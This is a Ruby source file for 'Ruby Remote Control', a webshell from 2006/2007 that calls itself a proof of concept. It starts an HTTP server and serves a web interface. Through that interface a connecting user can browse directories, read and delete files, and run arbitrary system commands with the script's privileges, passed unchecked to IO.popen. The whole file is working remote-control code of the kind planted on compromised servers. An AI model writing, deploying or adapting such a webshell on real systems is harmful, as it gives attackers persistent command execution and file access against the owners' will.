#!/usr/bin/env ruby
 
# Author: SkyOut
# Date: 2006/2007
# Website: http://core-security.net/
# Coded under: OpenBSD 4.0
# Ruby version: 1.8.4
 
# As this tool is very basic it only uses two standard
# classes, which should make it portable and usable
# everywhere
require 'socket'
require 'cgi'
 
# Default port is 9000 if the user does not specify
# another one
port = ARGV[0] || 9000
server = TCPServer.new('127.0.0.1', port)
 
# This will be displayed before the shell is started
# and will only be displayed in the shell
puts
puts
puts "+-----------------------------------------------+"
puts "|\t\t\t\t\t\t||"
puts "|\t[RRC] Ruby Remote Control\t\t||"
puts "|\tby SkyOut\t\t\t\t||"
puts "|\t\t\t\t\t\t||"
puts "|\tStarting the webshell on #{port}...\t||"
puts "|\t\t\t\t\t\t||"
puts "|\t-> Fighting for freedom or\t\t||"
puts "|\tdying in oppression! <-\t\t\t||"
puts "|\t\t\t\t\t\t||"
puts "+-----------------------------------------------+|"
puts " ------------------------------------------------+"
puts
puts
 
# The main code goes here ...
while (s = server.accept)
 
   s.print "HTTP/1.1 200/OK\r\nContent-type: text/html\r\n\r\n"
 
   s.print "<html><head><title>Ruby Remote Control [RRC]</title>\r\n\r\n"
 
   # These are the used CSS styles, which makes it easy to change and
   # edit the style of the webshell (its colors)
   s.print "<!-- CSS STYLE -->\r\n"
   s.print "<style type=\"text/css\"><!--\r\n"
   s.print "body { font-family: arial; background-color: #606060 }\r\n"
   s.print "body a.blue { color: #000080; text-decoration: none }\r\n"
   s.print "body a.grey { color: #808080; text-decoration: none }\r\n"
   s.print "body a.black { color: #000000; text-decoration: none }\r\n"
   s.print "body span.red { color: #800000; text-decoration: none }\r\n"
   s.print "body span.green { color: #005000; text-decoration: none }\r\n"
   s.print "body span.grey { color: #808080; text-decoration: none }\r\n"
   s.print "--></style>\r\n"
   s.print "<!-- -->\r\n\r\n"
 
   s.print "</head><body>\r\n\r\n"
 
   s.print "<!-- HEADER BOX -->\r\n"
   s.print "<b><fieldset>|| Ruby Remote Control [RRC] || SkyOut ||<br>\r\n"
   s.print "|| Index: http://host:9000/ || Help: Just leave the input field blank ||</fieldset></b><br>\r\n"
   s.print "<!-- -->\r\n\r\n"
 
   # The input field used for the directory listing
   s.print "<!-- INPUT FIELD FOR DIRECTORY OPENING -->\r\n"
   s.print "<form method=\"get\">\r\n"
   s.print "<input type=\"text\" name=\"open_dir\">\r\n"
   s.print "<input type=\"submit\" value=\"Open directory\"></form>\r\n"
   s.print "<!-- -->\r\n\r\n"
 
   # The input field used for the command execution
   s.print "<!-- INPUT FIELD FOR COMMAND EXECUTION -->\r\n"
   s.print "<form method=\"get\">\r\n"
   s.print "<input type=\"text\" name=\"cmd_exec\">\r\n"
   s.print "<input type=\"submit\" value=\"Execute command\"></form>\r\n"
   s.print "<!-- -->\r\n\r\n"
 
   # Sometimes it can happen, that Ruby identifies files differently, for example .mp3 files
   # will be shown as executables or .core files will be shown as normal files and more. To
   # make sure those special files can not be opened (do not get a " [+] " next to their name)
   # edit the array below.
   do_not_open = Array.new
   do_not_open = [".wmv", ".mpg", ".mpeg", ".avi", ".divx", ".mp4", ".mp3", ".ogg", ".flac", ".gif", ".png", ".jpg", ".jpeg", ".core"]
 
   # As mentioned above with the files, this is an array of file types, that shall be shown
   # as normal files and therefore it should be able to open them (like script files)
   do_open = Array.new
   do_open = [".sh", ".ksh", ".bash", ".csh", ".perl", ".tcl", ".rb", ".pl", ".py"]
 
   # The GET request to the server will be put into an array to filter out the
   # parts that we will use later
   get = s.gets
   get = get.split(' ')
   get = get.fetch(1)
   get = get.split('=')
 
   # This will be ?open_dir, ?open_file, ?delete_file or ?cmd_exec
   command = get[0]
   # This will contain the value after the " = " sign, example: ?open_dir=/home
   value = get[1]
 
   # The code for a directory listing goes here ...
 
   # Remember: In every function we use the CGI class to escape special
   # characters, for example " ?open_dir=/home/some%20name " will become
   # " ?open_dir=/home/some name "
   if (command == "/?open_dir") && (value != nil)
 
      dir = CGI.unescape(value)
 
      # Make sure the users input really calls an existing directory
      if (File.directory?(dir))
         # Make sure we have the right privileges to read it
         if (File.stat(dir).readable?)
 
            s.print "<fieldset style=\"width: 50%\"><legend><b>Directory listing: #{dir}</b></legend>\r\n"
            s.print "<b><font color=\"#800000\">[FILE]</font> <font color=\"#005000\">[EXECUTABLE]</font> <font color=\"#000080\">[DIRECTORY]</font> <font color=\"#C0C0C0\">[HIDDEN]</font> <font color=\"#000000\">[NO PERMISSIONS]</font></b><br>[+] = Open file [-] = Delete file<br><br>\r\n"
 
            # We build an array to finally check in which directory
            # we are (root directory or anything else) and build our
            # own link for moving one directory up
            dir_arr = dir.split('/')
            dir_arr.pop
            dir_arr.collect! {|x| "/" + x}
            dir_arr[0] = ""
 
            if (dir_arr.length >= 2)
               s.print "<b><a class=\"blue\" href=\"?open_dir=#{dir_arr}\">Up ..<br></a></b><br>\r\n"
            else
               s.print "<b><a class=\"blue\" href=\"?open_dir=/\">Up ..<br></a></b><br>\r\n"
            end
 
            # This loop will display every file in the directory
            Dir.foreach(dir) do |entry|
 
               # The " . " and " .. " entries will of course be ignored, therefore
               # we coded our own link (see above)
               next if entry == "." || entry == ".."
 
               # Now let's go over to the way the content is displayed and linked ...
 
               # The content is a DIRECTORY #####################################################
               if File.stat("#{dir}#{File::SEPARATOR}#{entry}").directory?
                  # If we are in the root directory do ...
                  if (dir == "/")
                     # If the directory is hidden (starts with a " . ") display it in a grey style
                     if (entry.match(/^\.{1}/))
                        # Make sure we have the rights to access the directory, if not there is no way to
                        # move into it (do not try doing it, it will fail or crash the shell)
                        if (File.stat("#{dir}#{File::SEPARATOR}#{entry}").readable?)
                           s.print "<b><a class=\"grey\" href=\"?open_dir=#{dir}#{entry}\">> #{entry}</a></b><br>\r\n"
                        else
                           s.print "<b>> #{entry}</b><br>\r\n"
                        end
                     # The same code as above, just for non-hidden directories
                     else
                        if (File.stat("#{dir}#{File::SEPARATOR}#{entry}").readable?)
                           s.print "<b><a class=\"blue\" href=\"?open_dir=#{dir}#{entry}\">> #{entry}</a></b><br>\r\n"
                        else
                           s.print "<b>> #{entry}</b><br>\r\n"
                        end
                     end
                  # If we are not in the root directory do the following ... (see above for more details)
                  else
                     if (entry.match(/^\.{1}/))
                        if (File.stat("#{dir}#{File::SEPARATOR}#{entry}").readable?)
                           s.print "<b><a class=\"grey\" href=\"?open_dir=#{dir}/#{entry}\">> #{entry}</a></b><br>\r\n"
                        else
                           s.print "<b>> #{entry}</b><br>\r\n"
                        end
                     else
                        if (File.stat("#{dir}#{File::SEPARATOR}#{entry}").readable?)
                           s.print "<b><a class=\"blue\" href=\"?open_dir=#{dir}/#{entry}\">> #{entry}</a></b><br>\r\n"
                        else
                           s.print "<b>> #{entry}</b><br>\r\n"
                        end
                     end
                  end
               next
               # The content is a DIRECTORY #####################################################
 
               # The content is NOT a DIRECTORY #####################################################
               else
                  # Check if the file is an executable, furthermore check for the current directory and if the
                  # file is hidden or not (see above for a more detailed explanation)
                  if File.stat("#{dir}#{File::SEPARATOR}#{entry}").executable?
 
                     # The file is hidden ...
                     if (entry.match(/^\.{1}/))
                        # Loop through our array to make sure files with the extensions named there
                        # can not be opened
                        if (do_not_open.include?(File.extname("#{entry.downcase}")))
                           if (dir == "/")
                              s.print "<span class=\"grey\"><b>#{entry}</b></span> <a class=\"grey\" href=\"?delete_file=#{dir}#{entry}\">[-]</a><br>\r\n"
                           else
                              s.print "<span class=\"grey\"><b>#{entry}</b></span> <a class=\"grey\" href=\"?delete_file=#{dir}/#{entry}\">[-]</a><br>\r\n"
                           end
                        # Loop through our array to make sure files with the extensions named there
                        # can be opened
                        elsif (do_open.include?(File.extname("#{entry.downcase}")))
                           if (dir == "/")
                              s.print "<span class=\"grey\"><b>#{entry}</b></span> <a class=\"grey\" href=\"?open_file=#{dir}#{entry}\">[+]</a> <a class=\"grey\" href=\"?delete_file=#{dir}#{entry}\">[-]</a><br>\r\n"
                           else
                              s.print "<span class=\"grey\"><b>#{entry}</b></span> <a class=\"grey\" href=\"?open_file=#{dir}/#{entry}\">[+]</a> <a class=\"grey\" href=\"?delete_file=#{dir}/#{entry}\">[-]</a><br>\r\n"
                           end
                        # The file is a normal hidden executable ...
                        else
                           if (dir == "/")
                              s.print "<span class=\"grey\"><b>#{entry}</b></span> <a class=\"grey\" href=\"?delete_file=#{dir}#{entry}\">[-]</a><br>\r\n"
                           else
                              s.print "<span class=\"grey\"><b>#{entry}</b></span> <a class=\"grey\" href=\"?delete_file=#{dir}/#{entry}\">[-]</a><br>\r\n"
                           end
                        end
 
                     # The executable is not hidden ... (same as above)
                     else
                        if (do_not_open.include?(File.extname("#{entry.downcase}")))
                           if (dir == "/")
                              s.print "<span class=\"green\"><b>#{entry}</b></span> <a class=\"grey\" href=\"?delete_file=#{dir}#{entry}\">[-]</a><br>\r\n"
                           else
                              s.print "<span class=\"green\"><b>#{entry}</b></span> <a class=\"grey\" href=\"?delete_file=#{dir}/#{entry}\">[-]</a><br>\r\n"
                           end
                        elsif (do_open.include?(File.extname("#{entry.downcase}")))
                           if (dir == "/")
                              s.print "<span class=\"green\"><b>#{entry}</b></span> <a class=\"grey\" href=\"?open_file=#{dir}#{entry}\">[+]</a> <a class=\"grey\" href=\"?delete_file=#{dir}#{entry}\">[-]</a><br>\r\n"
                           else
                              s.print "<span class=\"green\"><b>#{entry}</b></span> <a class=\"grey\" href=\"?open_file=#{dir}/#{entry}\">[+]</a> <a class=\"grey\" href=\"?delete_file=#{dir}/#{entry}\">[-]</a><br>\r\n"
                           end
                        else
                           if (dir == "/")
                              s.print "<span class=\"green\"><b>#{entry}</b></span> <a class=\"grey\" href=\"?delete_file=#{dir}#{entry}\">[-]</a><br>\r\n"
                           else
                              s.print "<span class=\"green\"><b>#{entry}</b></span> <a class=\"grey\" href=\"?delete_file=#{dir}/#{entry}\">[-]</a><br>\r\n"
                           end
                        end
                     end
 
                  # The file is not an executable, it is a normal file ... (see above for more details
                  # as this is quite the same as above)
                  else
 
                     if (entry.match(/^\.{1}/))
                        if (do_not_open.include?(File.extname("#{entry.downcase}")))
                           if (dir == "/")
                              s.print "<span class=\"grey\"><b>#{entry}</b></span> <a class=\"grey\" href=\"?delete_file=#{dir}#{entry}\">[-]</a><br>\r\n"
                           else
                              s.print "<span class=\"grey\"><b>#{entry}</b></span> <a class=\"grey\" href=\"?delete_file=#{dir}/#{entry}\">[-]</a><br>\r\n"
                           end
                        elsif (do_open.include?(File.extname("#{entry.downcase}")))
                           if (dir == "/")
                              s.print "<span class=\"grey\"><b>#{entry}</b></span> <a class=\"grey\" href=\"?open_file=#{dir}#{entry}\">[+]</a> <a class=\"grey\" href=\"?delete_file=#{dir}#{entry}\">[-]</a><br>\r\n"
                           else
                              s.print "<span class=\"grey\"><b>#{entry}</b></span> <a class=\"grey\" href=\"?open_file=#{dir}/#{entry}\">[+]</a> <a class=\"grey\" href=\"?delete_file=#{dir}/#{entry}\">[-]</a><br>\r\n"
                           end
                        else
                           if (dir == "/")
                              s.print "<span class=\"grey\"><b>#{entry}</b></span> <a class=\"grey\" href=\"?open_file=#{dir}#{entry}\">[+]</a> <a class=\"grey\" href=\"?delete_file=#{dir}#{entry}\">[-]</a><br>\r\n"
                           else
                              s.print "<span class=\"grey\"><b>#{entry}</b></span> <a class=\"grey\" href=\"?open_file=#{dir}/#{entry}\">[+]</a> <a class=\"grey\" href=\"?delete_file=#{dir}/#{entry}\">[-]</a><br>\r\n"
                           end
                        end
 
                     else
                        if (do_not_open.include?(File.extname("#{entry.downcase}")))
                           if (dir == "/")
                              s.print "<span class=\"red\"><b>#{entry}</b></span> <a class=\"grey\" href=\"?delete_file=#{dir}#{entry}\">[-]</a><br>\r\n"
                           else
                              s.print "<span class=\"red\"><b>#{entry}</b></span> <a class=\"grey\" href=\"?delete_file=#{dir}/#{entry}\">[-]</a><br>\r\n"
                           end
                        elsif (do_open.include?(File.extname("#{entry.downcase}")))
                           if (dir == "/")
                              s.print "<span class=\"red\"><b>#{entry}</b></span> <a class=\"grey\" href=\"?open_file=#{dir}#{entry}\">[+]</a> <a class=\"grey\" href=\"?delete_file=#{dir}#{entry}\">[-]</a><br>\r\n"
                           else
                              s.print "<span class=\"red\"><b>#{entry}</b></span> <a class=\"grey\" href=\"?open_file=#{dir}/#{entry}\">[+]</a> <a class=\"grey\" href=\"?delete_file=#{dir}/#{entry}\">[-]</a><br>\r\n"
                           end
                        else
                           if (dir == "/")
                              s.print "<span class=\"red\"><b>#{entry}</b></span> <a class=\"grey\" href=\"?open_file=#{dir}#{entry}\">[+]</a> <a class=\"grey\" href=\"?delete_file=#{dir}#{entry}\">[-]</a><br>\r\n"
                           else
                              s.print "<span class=\"red\"><b>#{entry}</b></span> <a class=\"grey\" href=\"?open_file=#{dir}/#{entry}\">[+]</a> <a class=\"grey\" href=\"?delete_file=#{dir}/#{entry}\">[-]</a><br>\r\n"
                           end
                        end
                     end
 
                  end
               next
               end
               # The content is NOT a DIRECTORY #####################################################
 
            end
            s.print "</fieldset>\r\n\r\n"
         else
            s.print "You do not have permissions to read: #{dir}\r\n\r\n"
         end
      else
         s.print "Directory does not exist!\r\n\r\n"
      end
 
   # If the user leaves the input field for the directory listing empty
   # a help dialogue will be opened
   elsif (command == "/?open_dir") && (value == nil)
 
      s.print "<fieldset style=\"width: 40%\"><legend>Help: Open directory</legend>\r\n"
      s.print "The open_dir function will open the specified directory path if it is valid and show you\r\n"
      s.print "the content in an interactive way.<br><br>Subdirectories will be displayed with a '>' before the name.\r\n"
      s.print "If you do not have the right permissions subdirectories are colored black and will not be opened\r\n"
      s.print "on clicking them. The other file types (file, executable, hidden) are shown in different colors to\r\n"
      s.print "make it easier to look over the content. Next to some files you can see a '[+]' to open them and\r\n"
      s.print "a '[-]' to delete them (as long as you have the permissions for doing so).<br><br>\r\n"
      s.print "In some cases it can happen, that even files, which should not be opened are marked with a '[+]'\r\n"
      s.print "symbol. This is a mistake of the internal ruby function and you should take care before clicking\r\n"
      s.print "around wildly!"
      s.print "</fieldset>\r\n\r\n"
 
   # The code for the function to display a files content goes here ...
   elsif (command == "/?open_file") && (value != nil)
 
      file = CGI.unescape(value)
 
      # Make sure the file is valid and exists
      if (File.file?(file))
         # Make sure we have the right privileges to read it
         if(File.readable?(file))
 
            # A new fieldset is opened and every line of the file is displayed
            # separately in this fieldset
            s.print "<fieldset><legend>Open file: #{file}</legend><pre>\r\n"
            File.open(file).each { |line| s.print "#{line}" }
            s.print "</pre></fieldset>\r\n\r\n"
 
         else
            s.print "You do not have permissions to read: #{file}\r\n\r\n"
         end
      else
         s.print "This is not a file or it does not exist: #{file}\r\n\r\n"
      end
 
   # The code for the function to delete a file goes here ...
   elsif (command == "/?delete_file") && (value != nil)
 
      file = CGI.unescape(value)
 
      # Make sure the file is valid and exists
      if (File.file?(file))
         # Make sure we have the right privileges to delete it
         if (File.writable?(file))
 
            # Finally delete the file and print a short message
            File.delete(file)
            s.print "File deleted succcessfully: #{file}\r\n\r\n"
 
         else
            s.print "You do not have the permissions to delete: #{file}\r\n\r\n"
         end
      else
         s.print "This is not a file or it does not exist: #{file}\r\n\r\n"
      end
 
 
   # The code for the command execution goes here ...
   elsif (command == "/?cmd_exec") && (value != nil)
 
      cmd = CGI.unescape(value)
      result = IO.popen("#{cmd}")
 
      s.print "<fieldset><legend>Command executed: #{cmd}</legend><pre>\r\n"
      result.each { |line| s.print "#{line}" }
      s.print "</pre></fieldset>\r\n\r\n"
 
   # If the user leaves the input field for the command execution empty
   # a help dialogue will be opened
   elsif (command == "/?cmd_exec") && (value == nil)
 
      s.print "<fieldset style=\"width: 40%\"><legend>Help: Command execution</legend>\r\n"
      s.print "The cmd_exec function gives you the ability to execute any command on the system with the\r\n"
      s.print "rights under which the ruby shell is running.<br><br>This is a very powerful and very dangerous function\r\n"
      s.print "and therefore you should take care and be sure about what you are doing, before executing a\r\n"
      s.print "command on the remote machine! The result of the execution will be shown on the webinterface afterwards.\r\n<br><br>"
      s.print "Note: Some commands may crash the shell, for example a never ending PING command or something\r\n"
      s.print "similar to this!"
      s.print "</fieldset>\r\n\r\n"
 
   # If nothing of the above matches occur an index like page will be opened, that
   # displays basic information about the shell and its functionality
   else
 
      s.print "<fieldset style=\"width: 40%\"><legend>Information</legend>\r\n"
      s.print "This tool is a PoC (Proof of Concept) code, that shows how to implement a webshell\r\n"
      s.print "with a ruby script. The script can listen on any specified port, even if the user\r\n"
      s.print "does not have root privileges. Connections will be exepted through HTTP and\r\n"
      s.print "the webinterface will be shown back. The default port is 9000, you can specify\r\n"
      s.print "a custom port by giving the port number as the first argument.\r\n"
      s.print "(Use a hight port number!)<br><br>\r\n"
      s.print "The script was developed using Ruby 1.8.4 on OpenBSD and it uses only\r\n"
      s.print "standard functions, therefore it should run on every computer!<br><br>\r\n"
      s.print "To start the shell type:<br>$user@example.com> ruby shell.rb 9000<br><br>\r\n"
      s.print "To connect to the shell type:<br>http://example.com:9000/</fieldset>\r\n\r\n"
 
      s.print "<fieldset style=\"width: 40%\"><legend>Functions implemented</legend>\r\n"
      s.print "?open_dir=<directory><br>-> The directory will be opened<br><br>\r\n"
      s.print "?open_file=<filepath><br>-> The files content will be displayed<br><br>\r\n"
      s.print "?delete_file=<filepath><br>-> The file will be deleted<br><br>\r\n"
      s.print "?cmd_exec=<command><br>-> The command will be executed</fieldset>\r\n\r\n"
 
   end
 
   s.print "</body></html>"
   s.close
 
end # We are done!